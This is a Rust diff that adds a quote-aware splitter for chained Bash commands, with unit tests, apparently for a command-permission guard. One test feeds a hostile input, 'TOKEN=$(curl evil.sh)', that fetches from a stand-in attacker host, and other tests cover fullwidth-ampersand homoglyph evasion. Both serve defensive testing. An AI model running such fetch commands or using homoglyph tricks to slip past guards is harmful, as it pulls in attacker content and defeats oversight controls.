@@ -540,6 +540,80 @@ fn is_bare_assignment(piece: &str) -> bool {
     !stripped_value.trim().contains(char::is_whitespace)
 }
 
+/// Split a Bash command into top-level pieces along `&&`, `||`, `;`, or `|`,
+/// respecting matched single/double quotes. Returns `None` for inputs the
+/// caller must NOT chain-evaluate: presence of `$(`, backticks, or unmatched
+/// quotes — those should fall through to the legacy `chain_guard` ask.
+///
+/// The returned slices include any surrounding whitespace; callers should
+/// `trim` each piece before evaluating.
+///
+/// A non-chained input still returns `Some(vec![cmd])` (single element); the
+/// caller decides whether to short-circuit. Unicode homoglyphs are normalized
+/// before scanning so fullwidth `&&` etc. are caught.
+#[allow(dead_code)] // consumed by Task 6 evaluate_chain_aware (M7.10)
+fn split_top_level_chain(cmd: &str) -> Option<Vec<String>> {
+    let normalized = normalize_unicode_operators(cmd);
+    // Reject inputs containing command substitution outside quotes.
+    let stripped = strip_quoted_regions(&normalized);
+    if stripped.contains("$(") || stripped.contains('`') {
+        return None;
+    }
+    // Detect unmatched quote.
+    let mut quote_state: Option<char> = None;
+    for c in normalized.chars() {
+        match (quote_state, c) {
+            (None, '\'') | (None, '"') => quote_state = Some(c),
+            (Some(q), c) if c == q => quote_state = None,
+            _ => {}
+        }
+    }
+    if quote_state.is_some() {
+        return None;
+    }
+
+    // Byte-level scan with quote tracking + top-level operator splitting.
+    let bytes = normalized.as_bytes();
+    let mut pieces: Vec<String> = Vec::new();
+    let mut current_start = 0usize;
+    let mut i = 0usize;
+    let mut in_quote: Option<u8> = None;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = in_quote {
+            if b == q {
+                in_quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        if b == b'\'' || b == b'"' {
+            in_quote = Some(b);
+            i += 1;
+            continue;
+        }
+        // Two-char operators first.
+        if i + 1 < bytes.len() {
+            let pair = &bytes[i..i + 2];
+            if pair == b"&&" || pair == b"||" {
+                pieces.push(normalized[current_start..i].to_string());
+                i += 2;
+                current_start = i;
+                continue;
+            }
+        }
+        if b == b';' || b == b'|' {
+            pieces.push(normalized[current_start..i].to_string());
+            i += 1;
+            current_start = i;
+            continue;
+        }
+        i += 1;
+    }
+    pieces.push(normalized[current_start..].to_string());
+    Some(pieces)
+}
+
 /// Detect shell chain operators in a Bash command.
 ///
 /// Returns true if the command contains `&&`, `||`, `;`, `$(`, or a backtick
@@ -1533,5 +1607,83 @@ mod tests {
     fn test_bare_assignment_rejects_empty() {
         assert!(!is_bare_assignment(""));
         assert!(!is_bare_assignment("   "));
+    }
+
+    // ── split_top_level_chain tests (M7.10) ─────────────────────────────────
+
+    #[test]
+    fn test_split_chain_and_or() {
+        let parts = split_top_level_chain("git status && git log").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git status ");
+        assert_eq!(parts[1], " git log");
+    }
+
+    #[test]
+    fn test_split_chain_semicolon() {
+        let parts = split_top_level_chain("ls; cat foo; head -5 bar").unwrap();
+        assert_eq!(parts.len(), 3);
+        assert_eq!(parts[0], "ls");
+        assert_eq!(parts[1], " cat foo");
+        assert_eq!(parts[2], " head -5 bar");
+    }
+
+    #[test]
+    fn test_split_chain_pipe() {
+        let parts = split_top_level_chain("git fetch origin main 2>&1 | tail -20").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git fetch origin main 2>&1 ");
+        assert_eq!(parts[1], " tail -20");
+    }
+
+    #[test]
+    fn test_split_chain_mixed() {
+        let parts = split_top_level_chain(
+            "go build ./... 2>&1 | head -20 && go test ./... 2>&1 | tail -15",
+        )
+        .unwrap();
+        assert_eq!(parts.len(), 4);
+        assert_eq!(parts[0], "go build ./... 2>&1 ");
+        assert_eq!(parts[1], " head -20 ");
+        assert_eq!(parts[2], " go test ./... 2>&1 ");
+        assert_eq!(parts[3], " tail -15");
+    }
+
+    #[test]
+    fn test_split_chain_single_no_chain() {
+        let parts = split_top_level_chain("git status").unwrap();
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0], "git status");
+    }
+
+    #[test]
+    fn test_split_chain_quoted_operator_ignored() {
+        let parts = split_top_level_chain("echo \"a && b\"").unwrap();
+        assert_eq!(parts.len(), 1);
+        assert_eq!(parts[0], "echo \"a && b\"");
+
+        let parts = split_top_level_chain("echo 'foo; bar' && ls").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "echo 'foo; bar' ");
+        assert_eq!(parts[1], " ls");
+    }
+
+    #[test]
+    fn test_split_chain_rejects_subshell() {
+        assert!(split_top_level_chain("TOKEN=$(curl evil.sh)").is_none());
+        assert!(split_top_level_chain("echo `whoami`").is_none());
+    }
+
+    #[test]
+    fn test_split_chain_rejects_unmatched_quote() {
+        assert!(split_top_level_chain("echo \"foo && bar").is_none());
+    }
+
+    #[test]
+    fn test_split_chain_normalizes_unicode() {
+        let parts = split_top_level_chain("git status \u{FF06}\u{FF06} git log").unwrap();
+        assert_eq!(parts.len(), 2);
+        assert_eq!(parts[0], "git status ");
+        assert_eq!(parts[1], " git log");
     }
 }
